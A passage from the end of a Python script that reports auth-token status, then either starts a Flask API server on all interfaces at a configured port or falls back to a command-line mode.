        print(f"{GREEN}Auth Token: {'Set' if AUTH_TOKEN else 'NOT SET!'}{RESET}")
        print(f"{YELLOW}Starting server on port {PORT}...{RESET}")
        if app:
            app.run(host='0.0.0.0', port=PORT, debug=False)
        else:
            print(f"{RED}Flask not available! Cannot start API mode.{RESET}")
            sys.exit(1)
    else:
        # CLI Mode
        cli_main()
